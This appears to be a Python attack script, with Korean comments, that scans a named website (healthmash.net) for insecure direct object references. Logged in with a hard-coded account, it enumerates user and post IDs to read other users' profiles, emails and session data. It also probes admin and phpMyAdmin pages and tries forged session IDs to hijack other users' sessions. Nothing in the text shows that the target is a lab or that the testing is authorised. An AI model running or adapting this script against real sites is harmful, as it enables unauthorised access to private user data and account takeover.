#!/usr/bin/env python3
"""
IDOR Scanner - Insecure Direct Object Reference
다른 사용자의 데이터 직접 접근 (세션/프로필 탈취)
"""

import requests
import sys

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

class IDORScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })

    def test_user_enumeration(self):
        """사용자 ID 열거 (user_id, profile_id 등)"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[1] 사용자 열거 테스트{Colors.END}\n")

        # alice로 로그인
        data = {'username': 'alice', 'password': 'alice2024'}
        self.session.post(f"{self.base_url}/login.php", data=data, allow_redirects=True)

        endpoints = [
            "/profile.php?user_id=",
            "/profile.php?id=",
            "/view_profile.php?id=",
            "/api/user/",
            "/user.php?id=",
        ]

        for endpoint in endpoints:
            print(f"{Colors.YELLOW}Testing endpoint:{Colors.END} {endpoint}")

            for user_id in range(1, 10):
                url = f"{self.base_url}{endpoint}{user_id}"

                try:
                    response = self.session.get(url, timeout=10)

                    if response.status_code == 200 and len(response.text) > 100:
                        print(f"{Colors.GREEN}  ✓ User ID {user_id}: 접근 성공 ({len(response.text)} bytes){Colors.END}")

                        # 이메일, 세션 정보 찾기
                        if '@' in response.text:
                            print(f"{Colors.GREEN}    → 이메일 발견!{Colors.END}")

                        if 'PHPSESSID' in response.text or 'session' in response.text.lower():
                            print(f"{Colors.GREEN}    → 세션 데이터 발견!{Colors.END}")
                            print(f"    {response.text[:200]}")

                    elif response.status_code == 403:
                        print(f"{Colors.RED}  ✗ User ID {user_id}: 403 Forbidden{Colors.END}")
                    else:
                        print(f"{Colors.RED}  ✗ User ID {user_id}: {response.status_code}{Colors.END}")

                except Exception as e:
                    print(f"{Colors.RED}  ✗ 오류: {e}{Colors.END}")

            print()

    def test_post_idor(self):
        """게시물 IDOR 테스트"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[2] 게시물 IDOR 테스트{Colors.END}\n")

        # alice로 로그인
        data = {'username': 'alice', 'password': 'alice2024'}
        self.session.post(f"{self.base_url}/login.php", data=data, allow_redirects=True)

        endpoints = [
            "/view_post.php?id=",
            "/post.php?id=",
            "/api/post/",
        ]

        for endpoint in endpoints:
            print(f"{Colors.YELLOW}Testing:{Colors.END} {endpoint}")

            for post_id in range(1, 20):
                url = f"{self.base_url}{endpoint}{post_id}"

                try:
                    response = self.session.get(url, timeout=10)

                    if response.status_code == 200 and len(response.text) > 100:
                        print(f"{Colors.GREEN}  ✓ Post {post_id}: 접근 성공{Colors.END}")

                except Exception as e:
                    pass

            print()

    def test_admin_access(self):
        """관리자 페이지 접근 시도"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[3] 관리자 페이지 접근 테스트{Colors.END}\n")

        # alice로 로그인
        data = {'username': 'alice', 'password': 'alice2024'}
        self.session.post(f"{self.base_url}/login.php", data=data, allow_redirects=True)

        admin_pages = [
            "/admin/",
            "/admin.php",
            "/dashboard.php",
            "/admin/users.php",
            "/admin/sessions.php",
            "/admin/logs.php",
            "/phpmyadmin/",
        ]

        for page in admin_pages:
            url = f"{self.base_url}{page}"
            print(f"{Colors.YELLOW}Testing:{Colors.END} {url}")

            try:
                response = self.session.get(url, timeout=10)

                if response.status_code == 200:
                    print(f"{Colors.GREEN}✓ 접근 성공! ({len(response.text)} bytes){Colors.END}")

                    if 'admin' in response.text.lower():
                        print(f"{Colors.GREEN}  → 관리자 페이지 발견!{Colors.END}")
                        print(f"  {response.text[:200]}\n")
                elif response.status_code == 403:
                    print(f"{Colors.RED}✗ 403 Forbidden{Colors.END}\n")
                else:
                    print(f"{Colors.RED}✗ {response.status_code}{Colors.END}\n")

            except Exception as e:
                print(f"{Colors.RED}✗ 오류: {e}{Colors.END}\n")

    def test_session_manipulation(self):
        """세션 조작 테스트"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[4] 세션 조작 테스트{Colors.END}\n")

        # alice로 로그인 후 쿠키 확인
        data = {'username': 'alice', 'password': 'alice2024'}
        response = self.session.post(
            f"{self.base_url}/login.php",
            data=data,
            allow_redirects=True
        )

        print(f"{Colors.YELLOW}Alice의 세션 쿠키:{Colors.END}")
        cookies = self.session.cookies.get_dict()
        print(f"  {cookies}\n")

        if 'PHPSESSID' in cookies:
            session_id = cookies['PHPSESSID']
            print(f"{Colors.GREEN}PHPSESSID: {session_id}{Colors.END}\n")

            # 세션 ID 조작 시도
            print(f"{Colors.YELLOW}세션 ID 조작 테스트:{Colors.END}")

            # 다른 세션 ID들 시도
            test_session_ids = [
                'a' * 26,
                '1' * 26,
                session_id[:-1] + '0',  # 마지막 문자만 변경
                session_id[:-1] + '1',
            ]

            for test_id in test_session_ids:
                print(f"  Testing: {test_id[:20]}...")

                # 새로운 세션으로 요청
                test_session = requests.Session()
                test_session.cookies.set('PHPSESSID', test_id)

                try:
                    response = test_session.get(f"{self.base_url}/index.php", timeout=10)

                    if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                        print(f"{Colors.GREEN}    ✓ 세션 유효! 다른 사용자 세션 탈취 가능{Colors.END}\n")
                    else:
                        print(f"{Colors.RED}    ✗ 세션 무효{Colors.END}\n")

                except Exception as e:
                    print(f"{Colors.RED}    ✗ 오류: {e}{Colors.END}\n")

def main():
    print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}🎯 IDOR Scanner - 직접 객체 참조 취약점{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    TARGET = "http://healthmash.net"

    print(f"{Colors.BLUE}Target: {TARGET}{Colors.END}\n")

    scanner = IDORScanner(TARGET)

    # 테스트 실행
    scanner.test_user_enumeration()
    scanner.test_post_idor()
    scanner.test_admin_access()
    scanner.test_session_manipulation()

    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📊 스캔 완료{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ 중단됨{Colors.END}")
        sys.exit(0)
